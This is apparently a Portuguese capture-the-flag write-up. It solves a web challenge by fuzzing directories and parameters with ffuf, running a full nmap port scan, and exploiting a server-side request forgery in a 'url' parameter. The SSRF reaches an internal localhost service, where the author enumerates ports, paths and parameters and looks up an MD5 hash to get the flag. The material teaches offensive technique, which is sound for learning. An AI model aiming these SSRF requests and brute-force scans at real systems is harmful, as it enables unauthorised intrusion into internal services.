# FuZZ to SSuRF

Desafio sem descrição.

## Assuntos relacionados ao desafio

- Enumeração de diretórios/arquivos
- Enumeração de portas
- Shell script

## Solução

Ao acessar o site do desafio é retornado:

```
$ curl https://[redacted]

404 page not found
```

Como está retornando 404, essa não é a página certa, a gente precisa descobrir
qual página retorna 200:

```
$ ffuf -u https://[redacted]/FUZZ -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

synchronize             [Status: 200, Size: 36, Words: 6, Lines: 2, Duration: 11ms]
:: Progress: [1273833/1273833] :: Job [1/1] :: 3656 req/sec :: Duration: [0:06:21] :: Errors: 0 ::
```

O parâmetro `-u` serve para informar a URL, o `-w` para informar o arquivo da
wordlist e o `-mc` para mostrar apenas os resultados que retornem 200. Acessando
a página:

```
$ curl https://[redacted]/synchronize

I'm expecting a get parameter... ;)
```

Fazendo uma enumeração nos parâmetros:

```
$ ffuf -u https://[redacted]/synchronize?FUZZ=1 -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

Address                 [Status: 200, Size: 46, Words: 7, Lines: 2, Duration: 15ms]
AssignmentForm          [Status: 200, Size: 46, Words: 7, Lines: 2, Duration: 16ms]
AddAuthItemForm         [Status: 200, Size: 46, Words: 7, Lines: 2, Duration: 15ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Todas as tentativas aqui estão retornando 200, a gente precisa filtrar os
resultados, todos os resultados "errados" tem o tamanho do response em 46,
adicionando o parâmetro `-fs` com o valor `46` para não mostrar os resultados
que tenham o response do tamanho 46:

```
$ ffuf -u https://[redacted]/synchronize?FUZZ=1 -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 46


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 46
________________________________________________

url                     [Status: 200, Size: 32, Words: 7, Lines: 2, Duration: 14ms]
:: Progress: [6453/6453] :: Job [1/1] :: 3729 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Passando o parâmetro encontrado:

```
$ curl https://[redacted]/synchronize?url=1

Do I have another open port? ;D
```

Escaneando todas as portas com [nmap][nmap]:

```
$ sudo nmap -T4 -sS -p- -Pn -oN nmap.txt [redacted]

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

O parâmetro `-T4` serve para aumentar o valor do timeout das requisições e ter
uma resposta mais "confiável", o `-sS` serve para não finalizar o processo de
3-Way Handshake (faz o scan ser mais rápido), o `-p-` serve para escanear da
porta 0 até a 65535, o `-Pn` serve para informar o nmap que o servidor está
funcionando pois o servidor não responde a pacotes ICMP (PING) e `-oN nmap.txt`
serve para salvar a saída do comando no arquivo nmap.txt.

Como só retornou a porta 22 e 80, não é porta acessada externamente, ai entra o
SSRF, Server-side request forgery, vamos fazer uma requisição que só é possível
a partir do servidor, vamos "forjar uma requisição no lado do servidor",
precisamos descobrir pra qual host será essa requisição interna, essa parte foi
manual, tentativa e erro, até que o erro mudou:

```
$ curl https://[redacted]/synchronize?url=http://127.0.0.1

Almost...

Try harder! ;D
```

Já temos o host, no caso, localhost do servidor, agora precisamos descrobrir a
porta. Fiz um script pra gerar uma wordlist com todas as portas possíveis:

```sh
#!/bin/sh

for PORT in $(seq 0 65535)
do
    echo "$PORT" >> wordlist_ports.txt
done
```

E fiz a enumeração:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:FUZZ -w ./wordlist_ports.txt                        


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:FUZZ
 :: Wordlist         : FUZZ: ./wordlist_ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

39                      [Status: 200, Size: 26, Words: 3, Lines: 4, Duration: 16ms]
18                      [Status: 200, Size: 26, Words: 3, Lines: 4, Duration: 17ms]
8                       [Status: 200, Size: 26, Words: 3, Lines: 4, Duration: 16ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Precisamos filtrar os resultados aqui também, dessa vez, o tamanho das respostas
"erradas" é 26:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:FUZZ -w ./wordlist_ports.txt -fs 26


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:FUZZ
 :: Wordlist         : FUZZ: ./wordlist_ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 26
________________________________________________

8090                    [Status: 200, Size: 19, Words: 4, Lines: 2, Duration: 11ms]
:: Progress: [65536/65536] :: Job [1/1] :: 3533 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
```

Acessando essa porta:

```
$ curl https://[redacted]/synchronize?url=http://127.0.0.1:8090

404 page not found
```

Voltou a retornar 404, precisamos descobrir qual o path correto:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:8090/FUZZ -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt 


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:8090/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

about                   [Status: 200, Size: 19, Words: 4, Lines: 2, Duration: 17ms]
logo                    [Status: 200, Size: 19, Words: 4, Lines: 2, Duration: 17ms]
rss                     [Status: 200, Size: 19, Words: 4, Lines: 2, Duration: 17ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Era apenas a página inicial que retornava 404, precisamos filtrar as respostas
aqui também, dessa vez o tamanho é 19:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:8090/FUZZ -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -fs 19


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:8090/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 19
________________________________________________

decode                  [Status: 200, Size: 42, Words: 7, Lines: 2, Duration: 10ms]
:: Progress: [1273833/1273833] :: Job [1/1] :: 3332 req/sec :: Duration: [0:15:23] :: Errors: 39 ::
```

Acessando o path encontrado:

```
$ curl https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode

I'm expecting a get parameter again... ;)
```

Fazendo a enumeração:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?FUZZ=1 -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

AssignmentForm          [Status: 200, Size: 51, Words: 8, Lines: 2, Duration: 16ms]
Albania                 [Status: 200, Size: 51, Words: 8, Lines: 2, Duration: 16ms]
ACTION                  [Status: 200, Size: 51, Words: 8, Lines: 2, Duration: 16ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Tudo retornando 200, dessa vez o tamanho da resposta a ser filtrado é 51:

```
$ ffuf -u https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?FUZZ=1 -w ~/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 51


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/Git/github.com/danielmiessler/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 51
________________________________________________

flag                    [Status: 200, Size: 61, Words: 7, Lines: 2, Duration: 11ms]
:: Progress: [6453/6453] :: Job [1/1] :: 3607 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Acessando o path com o parâmetro:

```
$ curl https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?flag=1

Come on.. be polite! Say 6050ce63e4bce6764cb34cac51fb44d1 xD
```

Identificando o tipo do hash:

```
$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6050ce63e4bce6764cb34cac51fb44d1

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
```

Procurando o hash em base de dados online de MD5, procurando por "MD5 Decrypt"
na internet, foi possível encontrar o valor:

```
$ echo -n 'please' | md5sum

6050ce63e4bce6764cb34cac51fb44d1  -
```

Passando o valor `please` para o parâmetro `flag`, temos a flag:

```
$ curl https://[redacted]/synchronize?url=http://127.0.0.1:8090/decode?flag=please

ZUP-CTF{7h1s1sth33@s13stSsRfFl4g3v3r}
```

[nmap]: https://nmap.org
